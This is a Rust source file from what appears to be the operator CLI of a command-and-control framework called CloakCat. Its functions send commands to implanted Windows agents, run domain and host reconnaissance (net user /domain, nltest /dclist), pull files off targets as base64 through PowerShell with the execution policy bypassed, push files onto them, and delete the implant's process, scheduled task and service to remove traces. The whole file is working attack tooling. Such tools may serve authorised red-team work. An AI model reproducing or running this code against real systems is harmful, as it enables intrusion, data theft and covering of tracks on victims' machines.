//! Recon and attack commands: attack, recon-low, recon-noisy, cleanup, hostinfo, netinfo,
//! download-small, upload-small.

use anyhow::{anyhow, Result};
use base64::Engine;

use crate::display;
use crate::http::{attack_once, resolve_agent_identifier, run_command_and_get_stdout};

use super::CliCtx;

fn remote_path_to_ps_b64(path: &str) -> Result<String> {
    let escaped = path.replace('\'', "''");
    let cmd = format!(
        "powershell -NoProfile -ExecutionPolicy Bypass -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{}'))\"",
        escaped
    );
    Ok(cmd)
}

pub fn cmd_attack(ctx: &CliCtx, agent: &str, command_parts: Vec<String>) -> Result<()> {
    let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;
    let command = command_parts.join(" ");
    attack_once(ctx.cli, ctx.base, &agent_id, &command)?;
    Ok(())
}

pub fn cmd_download_small(
    ctx: &CliCtx,
    agent: &str,
    remote_path: &str,
    local_path: &str,
) -> Result<()> {
    let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;
    let stdout_b64 = run_command_and_get_stdout(
        ctx.cli,
        ctx.base,
        &agent_id,
        &remote_path_to_ps_b64(remote_path)?,
    )?;
    let trimmed = stdout_b64.trim();
    let decoded = base64::engine::general_purpose::STANDARD
        .decode(trimmed)
        .map_err(|e| anyhow!("base64 decode failed: {e}"))?;
    std::fs::write(local_path, &decoded)?;
    display::print_success(&format!("saved {} bytes → {}", decoded.len(), local_path));
    Ok(())
}

pub fn cmd_upload_small(
    ctx: &CliCtx,
    agent: &str,
    local_path: &str,
    remote_path: &str,
) -> Result<()> {
    let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;
    let data =
        std::fs::read(local_path).map_err(|e| anyhow!("failed to read {}: {}", local_path, e))?;
    if data.len() > 1_000_000 {
        return Err(anyhow!("file too large (>1MB): {}", local_path));
    }
    let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
    let escaped_remote = remote_path.replace('\'', "''");
    let cmd = format!(
        "powershell -NoProfile -ExecutionPolicy Bypass -Command \"[IO.File]::WriteAllBytes('{remote}', [Convert]::FromBase64String(\\\"{b64}\\\"))\"",
        remote = escaped_remote,
        b64 = b64
    );
    attack_once(ctx.cli, ctx.base, &agent_id, &cmd)?;
    display::print_success(&format!(
        "uploaded {} ({} bytes) → {}:{}",
        local_path, data.len(), agent_id, remote_path
    ));
    Ok(())
}

pub fn cmd_recon_low(ctx: &CliCtx, agent: &str) -> Result<()> {
    let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;
    let cmds = [
        "whoami",
        "echo %USERNAME% %USERDOMAIN% %LOGONSERVER%",
        "systeminfo /fo csv /nh",
    ];
    for cmd in cmds {
        display::print_dispatch("recon-low", &agent_id, cmd);
        if let Err(e) = attack_once(ctx.cli, ctx.base, &agent_id, cmd) {
            eprintln!("[recon-low] command failed: {e}");
        }
    }
    Ok(())
}

pub fn cmd_recon_noisy(ctx: &CliCtx, agent: &str) -> Result<()> {
    let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;
    let cmds = ["whoami /all", "net user /domain", "nltest /dclist"];
    for cmd in cmds {
        display::print_dispatch("recon-noisy", &agent_id, cmd);
        if let Err(e) = attack_once(ctx.cli, ctx.base, &agent_id, cmd) {
            eprintln!("[recon-noisy] command failed: {e}");
        }
    }
    Ok(())
}

pub fn cmd_cleanup_windows(ctx: &CliCtx, agent: &str) -> Result<()> {
    let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;

    const PROC_NAME: &str = "cloakcat-agent";
    const FOLDER: &str = r"C:\ProgramData\CloakCat";
    const TASK_NAME: &str = "CloakCatAgent";
    const SERVICE_NAME: &str = "CloakCatAgent";

    let cmds = [
        format!(
            "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Stop-Process -Name '{proc}' -ErrorAction SilentlyContinue; Remove-Item '{folder}' -Recurse -Force -ErrorAction SilentlyContinue\"",
            proc = PROC_NAME,
            folder = FOLDER,
        ),
        format!(r#"schtasks /Delete /TN "{task}" /F"#, task = TASK_NAME),
        format!("sc delete {}", SERVICE_NAME),
    ];

    for cmd in cmds {
        display::print_dispatch("cleanup", &agent_id, &cmd);
        if let Err(e) = attack_once(ctx.cli, ctx.base, &agent_id, &cmd) {
            eprintln!("[cleanup] failed: {}", e);
        }
    }
    display::print_success(&format!("cleanup-windows finished for {}", agent_id));
    Ok(())
}

pub fn cmd_hostinfo(ctx: &CliCtx, agent: &str) -> Result<()> {
    let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;
    let cmds = ["hostname", "whoami", "systeminfo /fo csv /nh"];
    for cmd in cmds {
        display::print_dispatch("hostinfo", &agent_id, cmd);
        if let Err(e) = attack_once(ctx.cli, ctx.base, &agent_id, cmd) {
            eprintln!("[hostinfo] command failed: {}", e);
        }
    }
    Ok(())
}

pub fn cmd_netinfo(ctx: &CliCtx, agent: &str) -> Result<()> {
    let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;
    let cmds = [
        "ipconfig /all",
        "route print",
        r#"type C:\Windows\System32\drivers\etc\hosts"#,
    ];
    for cmd in cmds {
        display::print_dispatch("netinfo", &agent_id, cmd);
        if let Err(e) = attack_once(ctx.cli, ctx.base, &agent_id, cmd) {
            eprintln!("[netinfo] command failed: {}", e);
        }
    }
    Ok(())
}
